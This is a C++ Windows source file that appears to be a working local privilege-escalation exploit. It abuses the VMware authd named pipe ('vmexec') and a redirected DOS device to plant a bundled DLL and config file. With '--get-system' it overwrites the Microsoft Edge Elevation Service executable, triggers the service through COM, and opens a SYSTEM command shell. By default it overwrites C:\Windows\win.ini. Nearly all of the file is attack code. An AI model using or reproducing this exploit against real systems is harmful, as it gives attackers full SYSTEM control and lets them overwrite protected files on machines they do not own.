//#include <windows.h>

#include <windows.h>
#include <iostream>
#include <ShlObj.h>
#include <conio.h>
#include <TlHelp32.h>
#include <strsafe.h>
#include <SubAuth.h>
#include <comdef.h>
#include <userenv.h>
#include <wtsapi32.h>
#include <strsafe.h>
#pragma comment(lib, "wtsapi32.lib")
#include "resource.h"
#include "Win-Ops-Master.h"
using namespace std;
OpsMaster op;

#pragma warning(disable : 4996)

HANDLE hparent;
HANDLE hsft;
wchar_t dosdv[MAX_PATH];
wchar_t temp[MAX_PATH];




bool PrepFakeEnv() {

	std::wstring win = temp + std::wstring(L"\\Windows");
	std::wstring usrs = temp + std::wstring(L"\\Users");
	std::wstring programdata = temp + std::wstring(L"\\programdata");
	std::wstring programx86 = temp + std::wstring(L"\\Program Files (x86)");
	return op.CreateMountPoint(win, dosdv + std::wstring(L"\\Windows")) && op.CreateMountPoint(usrs, dosdv + std::wstring(L"\\Users"))
		&& op.CreateMountPoint(programdata, dosdv + std::wstring(L"\\Programdata")) && op.CreateMountPoint(programx86, dosdv + std::wstring(L"\\Program Files (x86)"));
}
void RunVMwareVMX(const char* src,const char* target) {


	HANDLE hpipe = CreateFile(L"\\\\.\\pipe\\vmware-authdpipe", FILE_READ_DATA | FILE_WRITE_DATA, NULL, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hpipe == INVALID_HANDLE_VALUE) {
		printf("failed to run vmware-vmx.exe, you may want to execute it yourself.\n");
		return;
	}
	char* buff = (char*)(malloc(9 + strlen(src) + strlen(target)));
	sprintf(buff, "vmexec \"%s*%s\"", src, target);
	DWORD bdw = 0;
	WriteFile(hpipe, buff, strlen(buff), &bdw, NULL);

	char buff2[4096];
	ReadFile(hpipe, buff2, 4096, &bdw, NULL);
	buff2[bdw] = '\0';
	printf("%s\n", buff2);
	CloseHandle(hpipe);
}

void SpawnShell()
{
	DWORD session_id = -1;
	DWORD session_count = 0;

	WTS_SESSION_INFOW* pSession = NULL;


	if (WTSEnumerateSessions(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSession, &session_count))
	{
		//log success
	}
	else
	{
		//log error
		return;
	}

	for (int i = 0; i < session_count; i++)
	{
		session_id = pSession[i].SessionId;

		WTS_CONNECTSTATE_CLASS wts_connect_state = WTSDisconnected;
		WTS_CONNECTSTATE_CLASS* ptr_wts_connect_state = NULL;

		DWORD bytes_returned = 0;
		if (::WTSQuerySessionInformation(
			WTS_CURRENT_SERVER_HANDLE,
			session_id,
			WTSConnectState,
			reinterpret_cast<LPTSTR*>(&ptr_wts_connect_state),
			&bytes_returned))
		{
			wts_connect_state = *ptr_wts_connect_state;
			::WTSFreeMemory(ptr_wts_connect_state);
			if (wts_connect_state != WTSActive) continue;
		}
		else
		{
			//log error
			continue;
		}

		HANDLE hImpersonationToken;

		if (!WTSQueryUserToken(session_id, &hImpersonationToken))
		{
			//log error
			continue;
		}
		DWORD token_ses_id = 0;
		DWORD ret_sz = 0;
		if (!GetTokenInformation(hImpersonationToken, TokenSessionId, &token_ses_id, sizeof(token_ses_id), &ret_sz)) {
			//error
			continue;
		}
		HANDLE hUserToken = NULL;
		HANDLE hCurrentProcessToken = NULL;
		HANDLE hproc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION | SYNCHRONIZE, FALSE, GetCurrentProcessId());
		OpenProcessToken(hproc, TOKEN_ALL_ACCESS, &hCurrentProcessToken);
		DuplicateTokenEx(hCurrentProcessToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hUserToken);
		CloseHandle(hCurrentProcessToken);
		SetTokenInformation(hUserToken, TokenSessionId, &token_ses_id, sizeof(token_ses_id));

		//ImpersonateLoggedOnUser(hUserToken);

		STARTUPINFOW StartupInfo = { 0 };
		StartupInfo.lpDesktop = (LPWSTR)L"winsta0\\default";

		PROCESS_INFORMATION processInfo = { 0 };

		WCHAR cmd[MAX_PATH];
		ExpandEnvironmentStrings(L"%COMSPEC%", cmd, MAX_PATH);

		BOOL result = CreateProcessAsUserW(hUserToken,
			cmd,
			cmd,
			//&Security1,
			//&Security2,
			NULL,
			NULL,
			FALSE,
			CREATE_NEW_CONSOLE,
			//lpEnvironment,
			NULL,
			//"C:\\ProgramData\\some_dir",
			NULL,
			&StartupInfo,
			&processInfo);

		if (result) {
			CloseHandle(processInfo.hProcess);
			CloseHandle(processInfo.hThread);
		}

		CloseHandle(hImpersonationToken);
		CloseHandle(hUserToken);

		//RevertToSelf();
	}

	WTSFreeMemory(pSession);
}
BOOL IsLocalSystem()
{
	HANDLE hToken;
	UCHAR bTokenUser[sizeof(TOKEN_USER) + 8 + 4 * SID_MAX_SUB_AUTHORITIES];
	PTOKEN_USER pTokenUser = (PTOKEN_USER)bTokenUser;
	ULONG cbTokenUser;
	SID_IDENTIFIER_AUTHORITY siaNT = SECURITY_NT_AUTHORITY;
	PSID pSystemSid;
	BOOL bSystem;

	if (!OpenProcessToken(GetCurrentProcess(),
		TOKEN_QUERY,
		&hToken))
		return FALSE;

	if (!GetTokenInformation(hToken, TokenUser, pTokenUser,
		sizeof(bTokenUser), &cbTokenUser))
	{
		CloseHandle(hToken);
		return FALSE;
	}

	CloseHandle(hToken);

	if (!AllocateAndInitializeSid(&siaNT, 1, SECURITY_LOCAL_SYSTEM_RID,
		0, 0, 0, 0, 0, 0, 0, &pSystemSid))
		return FALSE;

	bSystem = EqualSid(pTokenUser->User.Sid, pSystemSid);

	FreeSid(pSystemSid);

	return bSystem;
}

WCHAR EdgeSvcPath[MAX_PATH];
bool DoesEdgeSvcExist() {
	SC_HANDLE scmgr = OpenSCManagerW(NULL, NULL, GENERIC_READ);
	SC_HANDLE edge_svc = OpenServiceW(scmgr, L"MicrosoftEdgeElevationService", SERVICE_QUERY_CONFIG);
	bool res = GetLastError() == ERROR_SERVICE_DOES_NOT_EXIST;
	CloseServiceHandle(scmgr);
	if (res)
		return false;
	CloseServiceHandle(edge_svc);
	return true;
}
WCHAR* GetEdgeServicePath() {
	static bool z = true;
	if (z)
		z = false;
	else
		return EdgeSvcPath;
	if (!DoesEdgeSvcExist())
		return NULL;
	SC_HANDLE scmgr = OpenSCManagerW(NULL, NULL, GENERIC_READ);
	SC_HANDLE edge_svc = OpenServiceW(scmgr, L"MicrosoftEdgeElevationService", SERVICE_QUERY_CONFIG);
	CloseServiceHandle(scmgr);
	QUERY_SERVICE_CONFIG* svc_cfg = NULL;
	DWORD ndbytes = 0;
	QueryServiceConfigW(edge_svc, svc_cfg, NULL, &ndbytes);
	svc_cfg = (QUERY_SERVICE_CONFIG*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY | HEAP_GENERATE_EXCEPTIONS, ndbytes + 256);
	QueryServiceConfigW(edge_svc, svc_cfg, ndbytes, &ndbytes);
	WCHAR binpath[MAX_PATH];
	wcscpy_s(binpath, MAX_PATH, svc_cfg->lpBinaryPathName);
	HeapFree(GetProcessHeap(), NULL, svc_cfg);
	CloseServiceHandle(edge_svc);
	int j = 1;
	for (int i = 0; i < lstrlenW(binpath) - 2; i++) {

		EdgeSvcPath[i] = binpath[j];
		EdgeSvcPath[i + 1] = L'\0';
		j++;
	}

	return EdgeSvcPath;
}
bool IsEdgeSvcRunning() {

	if (!DoesEdgeSvcExist())
		return false;
	SC_HANDLE scmgr = OpenSCManagerW(NULL, NULL, GENERIC_READ);
	SC_HANDLE edge_svc = OpenServiceW(scmgr, L"MicrosoftEdgeElevationService", SERVICE_QUERY_STATUS);
	SERVICE_STATUS st = { 0 };
	QueryServiceStatus(edge_svc, &st);
	bool ret = st.dwCurrentState != SERVICE_STOPPED;
	CloseServiceHandle(scmgr);
	CloseServiceHandle(edge_svc);

	return ret;
}

class __declspec(uuid("4d40ca7e-d22e-4b06-abbc-4defecf695d8")) IFoo : public IUnknown {
public:
	virtual HRESULT __stdcall Method();
};
_COM_SMARTPTR_TYPEDEF(IFoo, __uuidof(IFoo));

DWORD WINAPI StartElevationSvc(void) {
	
	HRESULT hs = CoInitializeEx(NULL, COINIT_MULTITHREADED);
	if(FAILED(hs))
		printf("Warning CoInitializeEx returned 0x%0.8\n", hs);
	IFoo* pObject;
	struct __declspec(uuid("1FCBE96C-1697-43AF-9140-2897C7C69767")) CLSID_Object;
	
	CoCreateInstance(__uuidof(CLSID_Object), NULL, CLSCTX_LOCAL_SERVER,
		__uuidof(IFoo), reinterpret_cast<void**>(&pObject));
	CoUninitialize();
	return ERROR_SUCCESS;
}

int main(int argc, const char* argv[]) {

	Wow64EnableWow64FsRedirection(FALSE);
	if (IsLocalSystem()) {
		SpawnShell();
		return 0;
	}
#ifdef _WIN64
	printf("Only Win32 build is supported.");
	return 0;
#endif // !_WIN32

	char argv1[MAX_PATH];
	char argv2[MAX_PATH];
	bool get_system = false;
	if (argc == 2) {
		if (!stricmp(argv[1], "--get-system")) {
			if (DoesEdgeSvcExist()) {
				if (!IsEdgeSvcRunning()) {
					get_system = true;
					GetModuleFileNameA(GetModuleHandle(NULL), argv1, MAX_PATH);
					wcstombs(argv2, GetEdgeServicePath(), MAX_PATH);
				}
				else {
					printf("Edge elevation service is running, cannot overwrite the executable while running.\n");
					return 1;
				}
			}
			else {
				printf("Edge elevation service was not found, switch --get-system isn't supported.");
				return 1;
			}
		}
		else {
			printf("Invalid switch.\n");
			return 1;
		}
	}
	else if (argc == 3) {
		memcpy(argv1, argv[1], strlen(argv[1]));
		argv1[strlen(argv[1])] = '\0';
		memcpy(argv2, argv[2], strlen(argv[2]));
		argv2[strlen(argv[2])] = '\0';
	}
	else {
		memmove(argv1, "C:\\Users\\Public\\desktop.ini", 28);
		argv1[28] = '\0';
		memmove(argv2, "C:\\Windows\\win.ini", 19);
		argv2[19] = '\0';
	}
	
	ExpandEnvironmentStrings(std::wstring(L"%TEMP%\\" + op.GenerateRandomStr()).c_str(), temp, MAX_PATH);
	op.RRemoveDirectory(temp);
	SHCreateDirectory(NULL, std::wstring(std::wstring(temp) + L"\\Program Files\\VMware\\SSL").c_str());
	SHCreateDirectory(NULL, std::wstring(std::wstring(temp) + L"\\stage").c_str());
	HANDLE hcnf = op.OpenFileNative(std::wstring(std::wstring(temp) + L"\\Program Files\\VMware\\SSL\\openssl.cnf"), GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
	HMODULE hMod = GetModuleHandle(NULL);
	HRSRC cnfres = FindResource(hMod, MAKEINTRESOURCE(IDR_CNF1), L"cnf");
	DWORD cnfsz = SizeofResource(hMod, cnfres);
	void* cnfBuff = LoadResource(hMod, cnfres);
	op.WriteFileNative(hcnf, cnfBuff, cnfsz);
	CloseHandle(hcnf);
	HANDLE hdll = op.OpenFileNative(std::wstring(std::wstring(temp) + L"\\stage\\vmware-vmx.dll"), GENERIC_WRITE, ALL_SHARING, CREATE_ALWAYS);
	HRSRC dllres = FindResource(hMod, MAKEINTRESOURCE(IDR_DLL1), L"dll");
	DWORD dllsz = SizeofResource(hMod, dllres);
	void* dllBuff = LoadResource(hMod, dllres);
	op.WriteFileNative(hdll, dllBuff, dllsz);
	CloseHandle(hdll);
	Wow64EnableWow64FsRedirection(FALSE);
	QueryDosDevice(L"C:", dosdv, MAX_PATH);
	wstring tt = temp;
	tt.erase(0, 2);
	tt = dosdv + tt;
	PrepFakeEnv();
	HANDLE hlink = op.SetTokenDosDevice(tt);
	if (!hlink) {
		printf("Failed to create object manager symbolic link.\n");
		return 0;
	}
	HANDLE hevent = CreateEvent(NULL, FALSE, FALSE, L"vmware-vmx-success");
	HANDLE hevent2 = CreateEvent(NULL, FALSE, FALSE, L"vmware-vmx-end");
	RunVMwareVMX(argv1, argv2);
	WaitForSingleObject(hevent, INFINITE);
	CloseHandle(hlink);
	CloseHandle(hevent);
	WaitForSingleObject(hevent2, INFINITE);
	CloseHandle(hevent2);
	StartElevationSvc();
	printf("Press enter to exit...");
	_getch();
	return 0;
}